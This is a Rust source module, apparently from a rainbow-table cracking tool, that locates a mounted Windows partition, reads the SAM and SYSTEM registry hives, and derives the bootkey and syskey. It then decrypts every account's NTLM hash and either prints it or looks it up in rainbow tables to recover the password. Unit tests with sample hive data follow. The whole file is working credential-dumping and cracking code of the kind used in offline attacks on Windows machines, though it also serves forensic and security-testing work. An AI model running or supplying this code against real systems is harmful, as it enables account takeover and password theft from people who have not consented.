//! Dumps NTLM hashes from a Windows drive.
//!
//! This module is based off the https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/ blogpost
//! The implementation was made possible thanks to the accompanying code: https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashes.py

use std::{collections::HashMap, fs, path::Path};

use crate::{load_tables_from_dir, search_tables, Stealdows};

use aes::{
    cipher::{generic_array::GenericArray, BlockDecrypt, BlockDecryptMut, KeyIvInit},
    Aes128,
};
use anyhow::{ensure, Context, Result};
use cbc::Decryptor;
use comfy_table::{presets::UTF8_BORDERS_ONLY, Cell, Color, Table};
use crossterm::style::Stylize;
use cugparck_core::{Digest, Password};
use des::Des;
use digest::{Digest as _, Md5};
use nt_hive::{Hive, KeyNode, NtHiveError, NtHiveNameString};
use rc4::{KeyInit, Rc4, StreamCipher};
use sysinfo::{DiskExt, RefreshKind, System, SystemExt};

/// The default path of the SAM file.
const SAM_PATH: &str = "Windows/System32/config/SAM";

/// The default path of the SYSTEM file.
const SYSTEM_PATH: &str = "Windows/System32/config/SYSTEM";

/// The offset which identifies how is encrypted the hash.
const HASH_TYPE_OFFSET: usize = 0xAC;

/// The hash is encrypted using RC4.
const HASH_TYPE_RC4: u8 = 0x14;

/// The hash is encrypted using AES.
const HASH_TYPE_AES: u8 = 0x38;

/// The offset of the hash.
const HASH_OFFSET: usize = 0xA8;

/// The lengfth of the offset.
const HASH_OFFSET_LENGTH: usize = 0x4;

/// The value to add to the retrieved offset.
const OFFSET_ADD: u32 = 0xCC;

/// The length of the hash.
const HASH_LENGTH: usize = 0x10;

/// The offset of the username.
const USERNAME_OFFSET: usize = 0xC;

/// The offset of the username length.
const USERNAME_LENGTH_OFFSET: usize = 0x10;

/// The offset describing how the syseky is encrypted.
const SYSKEY_ENCRYPTION_OFFSET: usize = 0;

/// The syskey is encrypted using AES.
const AES_ENCRYPTED_SYSKEY: u8 = 3;

/// The offset to get the RC4-encrypted syskey.
const RC4_SYSKEY_OFFSET: usize = 0x80;

/// The offset to build the RC4 syskey encryption key.
const RC4_SYSKEY_KEY_OFFSET: usize = 0x70;

/// The start of the double-encrypted hash after the nt_offset if the RC4 cipher is used.
const RC4_ENCRYPTED_HASH_START: usize = 4;

/// The offset to get the AES-encrypted syskey.
const AES_SYSKEY_OFFSET: usize = 0x88;

/// The offset to build the AES syskey decryption IV.
const AES_SYSKEY_IV_OFFSET: usize = 0x78;

/// The start of the AES IV after the nt_offset.
const AES_IV_START: usize = 8;

/// The start of the double-encrypted hash after the nt_offset, if the AES cipher is used.
const AES_ENCRYPTED_HASH_START: usize = 24;

/// The shift array used to derive the bootkey.
const SHIFT_ARRAY_1: [u8; 16] = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7];

/// The second shift array used to reorder the DES source 1.
const SHIFT_ARRAY_2: [u8; 7] = [0, 1, 2, 3, 0, 1, 2];

/// The third shift array used to reorder the DES source 2.
const SHIFT_ARRAY_3: [u8; 7] = [3, 0, 1, 2, 3, 0, 1];

/// The first static string used to build the RC4 syskey encryption key.
const STRING_1: &[u8] = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0";

/// The second static string used to build the RC4 syskey encryption key.
const STRING_2: &[u8] = b"0123456789012345678901234567890123456789\0";

/// The "NTPASSWORD" static string.
const NTPASSWORD: &[u8] = b"NTPASSWORD\0";

/// Odd parity array for the DES key derivation algorithm.
const ODD_PARITY: [u8; 256] = [
    1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14, 16, 16, 19, 19, 21, 21, 22, 22, 25, 25,
    26, 26, 28, 28, 31, 31, 32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47, 49, 49,
    50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62, 64, 64, 67, 67, 69, 69, 70, 70, 73, 73,
    74, 74, 76, 76, 79, 79, 81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94, 97, 97,
    98, 98, 100, 100, 103, 103, 104, 104, 107, 107, 109, 109, 110, 110, 112, 112, 115, 115, 117,
    117, 118, 118, 121, 121, 122, 122, 124, 124, 127, 127, 128, 128, 131, 131, 133, 133, 134, 134,
    137, 137, 138, 138, 140, 140, 143, 143, 145, 145, 146, 146, 148, 148, 151, 151, 152, 152, 155,
    155, 157, 157, 158, 158, 161, 161, 162, 162, 164, 164, 167, 167, 168, 168, 171, 171, 173, 173,
    174, 174, 176, 176, 179, 179, 181, 181, 182, 182, 185, 185, 186, 186, 188, 188, 191, 191, 193,
    193, 194, 194, 196, 196, 199, 199, 200, 200, 203, 203, 205, 205, 206, 206, 208, 208, 211, 211,
    213, 213, 214, 214, 217, 217, 218, 218, 220, 220, 223, 223, 224, 224, 227, 227, 229, 229, 230,
    230, 233, 233, 234, 234, 236, 236, 239, 239, 241, 241, 242, 242, 244, 244, 247, 247, 248, 248,
    251, 251, 253, 253, 254, 254,
];

/// The AES-128-CBC decryptor.
type Aes128CbcDec = Decryptor<Aes128>;

/// A Windows account.
#[derive(PartialEq, Hash)]
struct Account {
    username: String,
    hash: Option<Digest>,
}

/// Returns the class name of a registry key.
fn class_name<'a>(hive_root: &KeyNode<&Hive<&'a [u8]>, &'a [u8]>, path: &str) -> Result<String> {
    Ok(hive_root
        .subpath(path)
        .unwrap()?
        .class_name()
        .unwrap()?
        .to_string())
}

/// Returns the value with the specified name in this registry key.
fn key_value<'a>(
    hive_root: &KeyNode<&Hive<&'a [u8]>, &'a [u8]>,
    path: &str,
    name: &str,
) -> Result<Vec<u8>> {
    Ok(hive_root
        .subpath(path)
        .unwrap()?
        .value(name)
        .unwrap()?
        .data()?
        .into_vec()?)
}

/// Does a permutation.
fn permute<const N: usize>(array: &[u8], permutations: [u8; N]) -> [u8; N] {
    let mut res = [0; N];
    for (i, permutation) in permutations.iter().enumerate() {
        res[i] = array[*permutation as usize];
    }

    res
}

/// Returns the double-encrypted NTLM hash when the RC4 cipher is used.
fn rc4_double_encrypted_hash(v: &[u8]) -> &[u8] {
    let nt_offset_slice = &v[HASH_OFFSET..HASH_OFFSET + HASH_OFFSET_LENGTH];
    let nt_offset = (u32::from_le_bytes(nt_offset_slice.try_into().unwrap()) + OFFSET_ADD) as usize;

    &v[nt_offset + RC4_ENCRYPTED_HASH_START..nt_offset + RC4_ENCRYPTED_HASH_START + HASH_LENGTH]
}

/// Returns the double-encrypted NTLM hash and its IV if the AES cipher is used.
fn aes_double_encrypted_hash(v: &[u8]) -> (&[u8], &[u8]) {
    let nt_offset_slice = &v[HASH_OFFSET..HASH_OFFSET + HASH_OFFSET_LENGTH];
    let nt_offset = (u32::from_le_bytes(nt_offset_slice.try_into().unwrap()) + OFFSET_ADD) as usize;

    let iv = &v[nt_offset + AES_IV_START..nt_offset + AES_IV_START + HASH_LENGTH];

    let hash = &v
        [nt_offset + AES_ENCRYPTED_HASH_START..nt_offset + AES_ENCRYPTED_HASH_START + HASH_LENGTH];

    (hash, iv)
}

/// Derives the bootkey.
fn derive_bootkey(jd: &str, skew1: &str, gbg: &str, data: &str) -> [u8; HASH_LENGTH] {
    let class_names_str = format!("{jd}{skew1}{gbg}{data}");
    let class_names = hex::decode(class_names_str).unwrap();

    permute(&class_names, SHIFT_ARRAY_1)
}

/// Derives a valid 8-byte DES key from a 7 key string.
// https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashes.py#L77
// https://github.com/rapid7/rex-powershell/blob/master/spec/file_fixtures/powerdump.ps1
fn derive_des_key(key: &[u8]) -> [u8; 8] {
    let mut new_key = [
        key[0] >> 1,
        ((key[0] & 0x01) << 6) | key[1] >> 2,
        ((key[1] & 0x03) << 5) | key[2] >> 3,
        ((key[2] & 0x07) << 4) | key[3] >> 4,
        ((key[3] & 0x0F) << 3) | key[4] >> 5,
        ((key[4] & 0x1F) << 2) | key[5] >> 6,
        ((key[5] & 0x3F) << 1) | key[6] >> 7,
        key[6] & 0x7F,
    ];

    for b in &mut new_key {
        *b = ODD_PARITY[(*b as usize) << 1];
    }

    new_key
}

/// Decrypts an RC4-encrypted syskey.
fn rc4_decrypt_syskey(f: &[u8], bootkey: &[u8]) -> [u8; HASH_LENGTH] {
    let enc_syskey: [u8; HASH_LENGTH] = f[RC4_SYSKEY_OFFSET..RC4_SYSKEY_OFFSET + HASH_LENGTH]
        .try_into()
        .unwrap();

    let syskey_key = &f[RC4_SYSKEY_KEY_OFFSET..RC4_SYSKEY_KEY_OFFSET + HASH_LENGTH];

    let mut md5 = Md5::new();
    md5.update(&syskey_key);
    md5.update(STRING_1);
    md5.update(&bootkey);
    md5.update(STRING_2);
    let md5_syskey = md5.finalize();

    let mut syskey = [0u8; HASH_LENGTH];
    let mut rc4 = Rc4::new(&md5_syskey);
    rc4.apply_keystream_b2b(&enc_syskey, &mut syskey).unwrap();

    syskey
}

/// Decrypts an AES-encrypted syskey.
fn aes_decrypt_syskey(f: &[u8], bootkey: &[u8]) -> [u8; HASH_LENGTH] {
    let enc_syskey = &f[AES_SYSKEY_OFFSET..AES_SYSKEY_OFFSET + HASH_LENGTH];
    let iv = &f[AES_SYSKEY_IV_OFFSET..AES_SYSKEY_IV_OFFSET + HASH_LENGTH];

    let mut aes = Aes128CbcDec::new(bootkey.into(), iv.into());
    let mut syskey = [0u8; HASH_LENGTH];
    aes.decrypt_block_b2b_mut(enc_syskey.into(), GenericArray::from_mut_slice(&mut syskey));

    syskey
}

/// Decrypts an RC4-DES-encrypted hash.
fn rc4_decrypt_hash(double_enc_hash: &[u8], syskey: &[u8], rid: &[u8]) -> [u8; HASH_LENGTH] {
    // RC4 key derivation
    let mut md5 = Md5::new();
    md5.update(syskey);
    md5.update(rid);
    md5.update(NTPASSWORD);
    let rc4_key = md5.finalize();

    // decryption
    let mut enc_hash = [0u8; HASH_LENGTH];
    let mut rc4 = Rc4::new(&rc4_key);
    rc4.apply_keystream_b2b(double_enc_hash, &mut enc_hash)
        .unwrap();

    enc_hash
}

/// Decrypts an AES-DES-encrypted hash.
fn aes_decrypt_hash(double_enc_hash: &[u8], syskey: &[u8], iv: &[u8]) -> [u8; HASH_LENGTH] {
    let mut aes = Aes128CbcDec::new(syskey.into(), iv.into());
    let mut enc_hash = [0u8; HASH_LENGTH];
    aes.decrypt_block_b2b_mut(
        double_enc_hash.into(),
        GenericArray::from_mut_slice(&mut enc_hash),
    );

    enc_hash
}

/// Decrypts a DES-encrypted NTLM hash.
fn des_decrypt_hash(enc_hash: &[u8], rid: &[u8]) -> Digest {
    let des_source_1 = permute(rid, SHIFT_ARRAY_2);
    let des_source_2 = permute(rid, SHIFT_ARRAY_3);

    let des_key_1 = derive_des_key(&des_source_1);
    let des_key_2 = derive_des_key(&des_source_2);

    let (enc_ntlm_1, enc_ntlm_2) = enc_hash.split_at(HASH_LENGTH / 2);

    let des = Des::new(des_key_1.as_slice().into());
    let mut ntlm_1 = [0u8; HASH_LENGTH / 2];
    des.decrypt_block_b2b(enc_ntlm_1.into(), GenericArray::from_mut_slice(&mut ntlm_1));

    let des = Des::new(des_key_2.as_slice().into());
    let mut ntlm_2 = [0u8; HASH_LENGTH / 2];
    des.decrypt_block_b2b(enc_ntlm_2.into(), GenericArray::from_mut_slice(&mut ntlm_2));

    let mut hash = Digest::new();
    hash.extend_from_slice(&ntlm_1);
    hash.extend_from_slice(&ntlm_2);

    hash
}

/// Gets the RC4-encrypted NTLM hash (Windows < 1607).
fn rc4_encrypted_hash(rid: &[u8], v: &[u8], f: &[u8], bootkey: &[u8]) -> Digest {
    let double_enc_hash = rc4_double_encrypted_hash(v);
    let syskey = rc4_decrypt_syskey(f, bootkey);

    let enc_hash = rc4_decrypt_hash(double_enc_hash, &syskey, rid);

    des_decrypt_hash(&enc_hash, rid)
}

/// Gets the AES-encrypted NTLM hash (Windows >= 1607).
fn aes_encrypted_hash(rid: &[u8], v: &[u8], f: &[u8], bootkey: &[u8]) -> Digest {
    let (double_enc_hash, aes_iv) = aes_double_encrypted_hash(v);

    let syskey = if f[SYSKEY_ENCRYPTION_OFFSET] == AES_ENCRYPTED_SYSKEY {
        aes_decrypt_syskey(f, bootkey)
    } else {
        rc4_decrypt_syskey(f, bootkey)
    };

    let enc_hash = aes_decrypt_hash(double_enc_hash, &syskey, aes_iv);

    des_decrypt_hash(&enc_hash, rid)
}

/// Returns the username of a RID.
fn username(v: &[u8]) -> String {
    let username_offset =
        u16::from_le_bytes(v[USERNAME_OFFSET..USERNAME_OFFSET + 2].try_into().unwrap()) as usize
            + OFFSET_ADD as usize;

    let username_length = v[USERNAME_LENGTH_OFFSET] as usize;
    let username = &v[username_offset..username_offset + username_length];
    NtHiveNameString::Utf16LE(username).to_string()
}

/// Parses a RID to get it to the correct format.
fn parse_rid(unordered_rid: &str) -> [u8; 4] {
    let hex = hex::decode(unordered_rid).unwrap();
    u32::from_le_bytes(hex.try_into().unwrap()).to_be_bytes()
}

/// Returns a vec of the accounts and their hashes present in the given SAM file.
fn decrypt_accounts(sam: &Path, system: &Path) -> Result<Vec<Account>> {
    let sam = fs::read(sam).context("Unable to read the SAM file")?;
    let system = fs::read(system).context("Unable to read the SYSTEM file")?;

    // If the Windows partition is in fast-startup mode, the hive will be considered "dirty".
    // We can still extract the hashes, but we need to ignore the header verifications.
    let (system_hive, sam_hive) = match Hive::new(system.as_ref()) {
        Ok(system_hive) => (system_hive, Hive::new(sam.as_ref())?),

        Err(NtHiveError::SequenceNumberMismatch { primary, secondary })
            if primary == secondary + 1 =>
        {
            println!(
                "{}",
                "The Windows partition is using fast-startup, disabling header verification"
                    .with(Color::Yellow)
            );
            (
                Hive::without_validation(system.as_ref())?,
                Hive::without_validation(sam.as_ref())?,
            )
        }

        Err(e) => return Err(e.into()),
    };

    let sam_root = sam_hive.root_key_node()?;
    let system_root = system_hive.root_key_node()?;

    let f = key_value(&sam_root, "SAM\\Domains\\Account", "F")?;

    // derive the bootkey
    let jd = class_name(&system_root, "ControlSet001\\Control\\LSA\\JD")?;
    let skew1 = class_name(&system_root, "ControlSet001\\Control\\LSA\\Skew1")?;
    let gbg = class_name(&system_root, "ControlSet001\\Control\\LSA\\GBG")?;
    let data = class_name(&system_root, "ControlSet001\\Control\\LSA\\Data")?;
    let bootkey = derive_bootkey(&jd, &skew1, &gbg, &data);

    let user_rid_key = sam_root.subpath("SAM\\Domains\\Account\\Users").unwrap()?;

    let mut accounts = Vec::new();
    for account in user_rid_key.subkeys().unwrap()? {
        let account = account?;

        let v = match account.value("V") {
            Some(v) => v?.data()?.into_vec()?,
            None => continue,
        };

        let username = username(&v);

        let unordered_rid = account.name()?;
        let rid = parse_rid(&unordered_rid.to_string());

        let hash = match v[HASH_TYPE_OFFSET] {
            HASH_TYPE_RC4 => Some(rc4_encrypted_hash(&rid, &v, &f, &bootkey)),
            HASH_TYPE_AES => Some(aes_encrypted_hash(&rid, &v, &f, &bootkey)),
            _ => None,
        };

        accounts.push(Account { username, hash });
    }

    Ok(accounts)
}

/// Dumps the hashes of the specified acounts.
fn dump_accounts(accounts: Vec<Account>) {
    let mut display_table = Table::new();
    display_table.load_preset(UTF8_BORDERS_ONLY);
    display_table.set_header(vec!["Username", "Hash"]);

    for account in accounts {
        let username = Cell::new(account.username);

        let hash = account
            .hash
            .map(|hash| Cell::new(hex::encode(hash)).fg(Color::Green))
            .unwrap_or_else(|| Cell::new("No hash found").fg(Color::Grey));

        display_table.add_row(vec![username, hash]);
    }

    println!("{display_table}");
}

/// Dumps the hashes of the specified accounts and tries to crack them.
fn crack_accounts(accounts: Vec<Account>, dir: &Path, low_memory: bool) -> Result<()> {
    let (mmaps, is_compressed) = load_tables_from_dir(dir)?;

    let mut display_table = Table::new();
    display_table.load_preset(UTF8_BORDERS_ONLY);
    display_table.set_header(vec!["Username", "Hash", "Password"]);

    // we use a hashmap so if we have two times the same hash we don't attack it twice.
    let mut passwords: HashMap<Digest, Option<Password>> = HashMap::from_iter(
        accounts
            .iter()
            .filter_map(|account| Some((account.hash?, None))),
    );

    for (hash, password) in &mut passwords {
        *password = search_tables(*hash, &mmaps, is_compressed, low_memory)?;
    }

    for account in accounts {
        let username = Cell::new(account.username);

        let hash = account
            .hash
            .map(|account| Cell::new(hex::encode(account)).fg(Color::Green))
            .unwrap_or_else(|| Cell::new("No hash found").fg(Color::Grey));

        let password = account
            .hash
            .map(|hash| {
                passwords
                    .get(&hash)
                    .unwrap()
                    .map(|password| Cell::new(password).fg(Color::Green))
                    .unwrap_or_else(|| Cell::new("No password found").fg(Color::Red))
            })
            .unwrap_or_else(|| Cell::new("No password found").fg(Color::Grey));

        display_table.add_row(vec![username, hash, password]);
    }

    println!("{display_table}");

    Ok(())
}

pub fn stealdows(args: Stealdows) -> Result<()> {
    let sam;
    let system;

    if args.sam.is_some() {
        sam = args.sam.unwrap();
        system = args.system.unwrap();
    } else {
        let sys = System::new_with_specifics(RefreshKind::new().with_disks().with_disks_list());
        let mut sam_try = None;
        let mut system_try = None;

        for disk in sys.disks() {
            let sam_path = disk.mount_point().join(SAM_PATH);
            let system_path = disk.mount_point().join(SYSTEM_PATH);

            if sam_path.exists() && system_path.exists() {
                sam_try = Some(sam_path);
                system_try = Some(system_path);
                break;
            }
        }

        ensure!(
            sam_try.is_some(),
            "Unable to automatically find the SAM and SYSTEM files. Is the Windows partition correctly mounted?\n\
            Suggestion: Try to specify the two files manually with the --sam and --system flags"
        );

        sam = sam_try.unwrap();
        system = system_try.unwrap();
    }

    let mut accounts = decrypt_accounts(&sam, &system)
        .context("Error when decrypting the SAM or the SYSTEM file")?;

    if !args.user.is_empty() {
        accounts.retain(|account| args.user.contains(&account.username));
    }

    if let Some(dir) = args.crack {
        crack_accounts(accounts, &dir, args.low_memory)?;
    } else {
        dump_accounts(accounts);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    // The test cases are taken from the values found in https://github.com/tijldeneut/Security/blob/master/DumpSomeHashes/DumpSomeHashes.py.
    // Be aware that the comments contains the wrong values but running the script produces the following values.

    const USERNAME_TEST: &str = "Administrator";
    const JD_TEST: &str = "5d5991a3";
    const SKEW1_TEST: &str = "486c0596";
    const GBG_TEST: &str = "5af83341";
    const DATA_TEST: &str = "3f2cceb9";
    const RID_TEST: &str = "f4010000";
    const F_TEST: &str = "02000100000000008922ABD40ABBD00102000000000000000080A60AFFDEFFFF0000000000000000000000000000008000CC1DCFFBFFFFFF00CC1DCFFBFFFFFF0000000000000000EA03000000000000000000000000000001000000030000000100000000000100010000003800000070A7884DA3FA7F816CBD324E7AC3996F97700B19AB0FA48F3F5FED8ED046C6800D46426B8A38966C5E0963469F6DB0930000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000038000000DD4EFAEE9909FAC10C3184FD2E5BCFCEDE87D82F0DAEA73417E2850654CD9C7ED3AFF93CB2010B59DA9B8D1FEC3FBC140000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000300000000000000";
    const V_TEST: &str = "00000000F400000002000100F40000001A00000000000000100100000000000000000000100100006C000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000000000000000000007C01000015000000A80000009401000008000000010000009C0100001800000000000000B40100003800000000000000EC010000180000000000000004020000180000000000000001001480D4000000E40000001400000044000000020030000200000002C014004400050101010000000000010000000002C01400FFFF1F000101000000000005070000000200900004000000000014005B03020001010000000000010000000000001800FF070F0001020000000000052000000020020000000038001B030200010A00000000000F0300000000040000DEA22867213ED2AF19AD5D79B0C107292756FC20D8AD66F610F268FADF2AF80F0000240044000200010500000000000515000000AEAD0F17744EFAAA4E42D564F40100000102000000000005200000002002000001020000000000052000000020020000410064006D0069006E006900730074007200610074006F0072000D0F4200750069006C0074002D0069006E0020006100630063006F0075006E007400200066006F0072002000610064006D0069006E006900730074006500720069006E0067002000740068006500200063006F006D00700075007400650072002F0064006F006D00610069006E00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF0001000102000007000000030002000000000019E019C9BAB887A2249FF09ABB46471503000200100000006D59CBE78A9468F4853C654E078BCD46562ACE54C9B1CF001EA3D604E97FD80EE1AE05C23A2D801CF0F200AFB9F2E3E20300020000000000C115545B6446AF39F22A0416D1E16B500300020000000000A29F2D9AD08083FEF1D81ACF18202663";
    const DOUBLE_ENC_HASH_TEST: &str = "562ace54c9b1cf001ea3d604e97fd80e";
    const ENC_HASH_TEST: &str = "a291d14b768a6ac455a0ab9d376d8551";
    const BOOTKEY_TEST: &str = "5a6c489141f82ca35d05593fce33b996";
    const SYSKEY_TEST: &str = "afe7e35df020b79484a1c49440f90f18";
    const IV_TEST: &str = "6d59cbe78a9468f4853c654e078bcd46";
    const HASH_TEST: &str = "32ed87bdb5fdc5e9cba88547376818d4";

    use super::{
        aes_decrypt_hash, aes_double_encrypted_hash, derive_bootkey, derive_des_key,
        des_decrypt_hash, username,
    };
    use crate::stealdows::{parse_rid, rc4_decrypt_syskey};

    #[test]
    fn test_username() {
        let username = username(&hex::decode(V_TEST).unwrap());

        assert_eq!(USERNAME_TEST, username);
    }

    #[test]
    fn test_parse_rid() {
        let unordered_rid = "000001f4";
        let rid = parse_rid(unordered_rid);

        assert_eq!(RID_TEST, hex::encode(rid));
    }

    #[test]
    fn test_derive_des_key() {
        let source_1 = [0xf4, 0x01, 0x00, 0x00, 0xf4, 0x01, 0x00];
        let expected_des_key_1 = [0xf4, 0x01, 0x40, 0x01, 0x0e, 0xa1, 0x04, 0x01];

        let actual_des_key_1 = derive_des_key(&source_1);
        assert_eq!(expected_des_key_1.as_slice(), actual_des_key_1.as_slice());

        let source_2 = [0x00, 0xf4, 0x01, 0x00, 0x00, 0xf4, 0x01];
        let expected_des_key_2 = [0x01, 0x7a, 0x01, 0x20, 0x01, 0x07, 0xd0, 0x02];

        let actual_des_key_2 = derive_des_key(&source_2);
        assert_eq!(expected_des_key_2.as_slice(), actual_des_key_2.as_slice());
    }

    #[test]
    fn test_aes_double_encrypted_hash() {
        let v_test = hex::decode(V_TEST).unwrap();

        let (hash, iv) = aes_double_encrypted_hash(&v_test);

        assert_eq!(DOUBLE_ENC_HASH_TEST, hex::encode(hash));
        assert_eq!(IV_TEST, hex::encode(iv));
    }

    #[test]
    fn test_derive_bootkey() {
        let bootkey = derive_bootkey(JD_TEST, SKEW1_TEST, GBG_TEST, DATA_TEST);
        assert_eq!(BOOTKEY_TEST, hex::encode(bootkey));
    }

    #[test]
    fn test_rc4_decrypt_syskey() {
        let f_test = hex::decode(F_TEST).unwrap();

        let syskey = rc4_decrypt_syskey(&f_test, &hex::decode(BOOTKEY_TEST).unwrap());

        assert_eq!(SYSKEY_TEST, hex::encode(syskey));
    }

    #[test]
    fn test_aes_decrypt_hash() {
        let enc_hash = aes_decrypt_hash(
            &hex::decode(DOUBLE_ENC_HASH_TEST).unwrap(),
            &hex::decode(SYSKEY_TEST).unwrap(),
            &hex::decode(IV_TEST).unwrap(),
        );

        assert_eq!(ENC_HASH_TEST, hex::encode(enc_hash));
    }

    #[test]
    fn test_des_decrypt_hash() {
        let hash = des_decrypt_hash(
            &hex::decode(ENC_HASH_TEST).unwrap(),
            &hex::decode(RID_TEST).unwrap(),
        );

        assert_eq!(HASH_TEST, hex::encode(hash));
    }
}
